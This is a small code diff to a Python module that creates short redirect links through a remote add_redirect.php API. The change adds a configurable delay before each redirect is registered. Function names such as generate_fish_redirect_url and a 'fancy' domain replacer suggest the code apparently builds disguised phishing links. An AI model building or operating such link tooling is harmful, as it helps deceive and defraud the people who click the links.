@@ -1,4 +1,5 @@
 import aiohttp
+import asyncio
 
 from app.utils.fancy_replacer import replace_with_fancy
 from app.utils.text_formatter import generate_random_string
@@ -9,7 +10,8 @@ def generate_fish_redirect_url():
     return f"{replace_with_fancy(REDIRECTS_DOMAIN)}/{generate_random_string(length=5)}"
 
 
-async def set_redirect(target_url: str, redirect_alias: str) -> bool:
+async def set_redirect(target_url: str, redirect_alias: str, delay: int) -> bool:
+    await asyncio.sleep(delay)
     url = f"http://{REDIRECTS_DOMAIN}/add_redirect.php"
     headers = {
         'Authorization': f'Bearer {REDIRECTS_API_KEY}',
